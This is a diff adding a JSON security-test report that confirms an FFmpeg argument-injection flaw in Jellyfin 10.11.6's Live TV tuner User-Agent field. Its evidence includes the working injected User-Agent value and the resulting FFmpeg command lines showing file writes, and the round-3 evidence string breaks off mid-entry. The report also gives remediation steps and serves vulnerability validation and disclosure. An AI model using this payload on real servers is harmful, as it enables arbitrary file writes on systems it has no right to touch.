@@ -1,0 +1,53 @@
+{
+  "script": "phase9_pristine_ffmpeg_ua",
+  "phase": "phase9",
+  "target": "Jellyfin 10.11.6",
+  "start_time": "2026-03-02T18:58:09.695039",
+  "end_time": "2026-03-02T18:58:48.943405",
+  "summary": {
+    "total_tests": 3,
+    "findings": 1,
+    "anomalies": 0
+  },
+  "tests": [
+    {
+      "id": "PRISTINE-R1",
+      "description": "Pristine round 1: FFmpeg UA injection",
+      "request": "Inject UA, trigger HLS, check FFmpeg cmdline",
+      "response": "Injection=True, FileWrite=True",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:58:22.036865"
+    },
+    {
+      "id": "PRISTINE-R2",
+      "description": "Pristine round 2: FFmpeg UA injection",
+      "request": "Inject UA, trigger HLS, check FFmpeg cmdline",
+      "response": "Injection=True, FileWrite=True",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:58:34.562599"
+    },
+    {
+      "id": "PRISTINE-R3",
+      "description": "Pristine round 3: FFmpeg UA injection",
+      "request": "Inject UA, trigger HLS, check FFmpeg cmdline",
+      "response": "Injection=True, FileWrite=True",
+      "result": "VULN",
+      "severity": "INFO",
+      "timestamp": "2026-03-02T18:58:47.244255"
+    }
+  ],
+  "findings": [
+    {
+      "id": "FFMPEG-UA-001-PRISTINE",
+      "severity": "HIGH",
+      "title": "FFmpeg argument injection via Live TV tuner User-Agent (VALIDATED 3/3 rounds)",
+      "details": "Pristine validation confirmed 3 of 3 rounds. The TunerHostInfo.UserAgent field accepts arbitrary values including FFmpeg command-line arguments (quotes, -f, -i, -y flags). These are passed to FFmpeg via string concatenation in EncodingHelper.GetUserAgentParam() (line 495) and MediaEncoder.cs (line 459). The -report flag injection successfully wrote a file to the container filesystem, confirming arbitrary file write capability.",
+      "evidence": "[\n  {\n    \"round\": 1,\n    \"tuner_id\": \"5945cb6e1d704c69af7c60297526217a\",\n    \"channel_id\": \"24974a1bf50b80ff4e81c72b373532e1\",\n    \"stored_ua\": \"Mozilla/5.0\\\" -loglevel verbose -report -i \\\"\",\n    \"injection_confirmed\": true,\n    \"file_write_confirmed\": true,\n    \"ffmpeg_cmd\": \"[2026-03-02 23:58:18.522 +00:00] [INF] [76] MediaBrowser.MediaEncoding.Transcoding.TranscodeManager: \\\"/usr/lib/jellyfin-ffmpeg/ffmpeg\\\" \\\"-analyzeduration 200M -probesize 1G -user_agent \\\\\\\"Mozilla/5.0\\\\\\\" -loglevel verbose -report -i \\\\\\\"\\\\\\\" -fflags +igndts  -i \\\\\\\"http://[REDACTED-INTERNAL-IP]:9999/movies/Test_Movie_2026.mp4\\\\\\\" -map_metadata -1 -map_chapters -1 -threads 0 -sn -codec:v:0 libx264 -preset superfast -crf 23 -maxrate 0 -bufsize 0 -x264opts:0 subme=0:me_range=16:rc_lookahead=10:me=hex:open_gop=0 -force_key\",\n    \"status\": \"CONFIRMED\"\n  },\n  {\n    \"round\": 2,\n    \"tuner_id\": \"2321d1fb987d4b849657a4a1a9c0a7b8\",\n    \"channel_id\": \"24974a1bf50b80ff4e81c72b373532e1\",\n    \"stored_ua\": \"Mozilla/5.0\\\" -loglevel verbose -report -i \\\"\",\n    \"injection_confirmed\": true,\n    \"file_write_confirmed\": true,\n    \"ffmpeg_cmd\": \"[2026-03-02 23:58:31.028 +00:00] [INF] [73] MediaBrowser.MediaEncoding.Transcoding.TranscodeManager: \\\"/usr/lib/jellyfin-ffmpeg/ffmpeg\\\" \\\"-analyzeduration 200M -probesize 1G -user_agent \\\\\\\"Mozilla/5.0\\\\\\\" -loglevel verbose -report -i \\\\\\\"\\\\\\\" -fflags +igndts  -i \\\\\\\"http://[REDACTED-INTERNAL-IP]:9999/movies/Test_Movie_2026.mp4\\\\\\\" -map_metadata -1 -map_chapters -1 -threads 0 -sn -codec:v:0 libx264 -preset superfast -crf 23 -maxrate 0 -bufsize 0 -x264opts:0 subme=0:me_range=16:rc_lookahead=10:me=hex:open_gop=0 -force_key\",\n    \"status\": \"CONFIRMED\"\n  },\n  {\n    \"round\": 3,\n    \"tuner_id\": \"bd8508840cbc4ae994640088bdf1d188\",\n    \"channel_id\": \"24974a1bf50b80ff4e81c72b373532e1\",\n    \"stored_ua\": \"Mozilla/5.0\\\" -loglevel verbose -report -i \\\"\",\n    \"injection_confirmed\": true,\n    \"file_write_confirmed\": true,\n    \"ffmpeg_cmd\": \"[2026-03-02 23:58:43.642 +00:00] [INF] [78] MediaBrowser.MediaEnco",
+      "remediation": "1. Sanitize UserAgent values: strip double quotes, reject values containing FFmpeg argument patterns.\n2. Use ProcessStartInfo.ArgumentList instead of string concat.\n3. Apply the same ContainerValidationRegex to User-Agent/Referer.",
+      "timestamp": "2026-03-02T18:58:48.943405"
+    }
+  ],
+  "anomalies": []
+}
